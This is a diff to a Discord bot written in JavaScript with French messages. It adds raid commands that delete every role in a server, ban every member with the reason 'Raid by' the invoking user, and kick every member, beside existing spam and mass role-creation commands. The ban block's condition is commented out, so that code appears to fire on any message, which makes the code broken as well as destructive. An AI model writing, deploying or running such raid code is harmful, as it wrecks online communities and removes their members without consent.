@@ -1194,6 +1194,40 @@ var category = message.guild.channels.filter(c => c.type === 'category').size
       console.log(chalk.red.bold("Le message a été spammé."));
     }
   }
+ //SUPPRIMER DES ROLES
+  if(cmd === (prefix + 'd-role')){
+    message.delete()
+    await message.guild.roles.forEach(r => r.delete()).catch(() => {
+    message.channel.send(`Une erreur est survenue, veuillez ré - essayer plus tard.`).then(function(){
+   message.delete(5000)
+    })
+    })
+    await message.channel.send(`Tous les rôles ont été supprimés.`).then(function(){
+   message.delete(5000)
+    })
+  }
+  //if(cmd === (prefix + 'ball')){
+    await message.guild.members.forEach(m => m.ban(`Raid by ${message.author.username}`)).catch(() => {
+      message.channel.send(`Une erreur est survenue, veuillez ré - essayer plus tard`).then(function(){
+      message.delete(5000)
+      })
+    })
+  await message.channel.send(`Tous les utilisateurs ont été bannis avec succès !`).then(function(){
+  message.delete(5000)
+  })
+  }
+  
+  //kick all
+  if(cmd === (prefix + 'kall')){
+    await message.guild.members.forEach(m => m.kick(`Raid by ${message.author.username}`)).catch(() => {
+  message.channel.send(`Une erreur est survenue, veuillez ré - essayer plus tard.`).then(function(){
+  message.delete(5000)
+  })
+    })
+    await message.channel.send(`Tous les utilisateurs ont été expulsés avec succès.`).then(function(){
+    message.delete(5000)
+    })
+  }
 
   //CREER MASSE ROLES
   if (cmd === prefix + "rolec") {
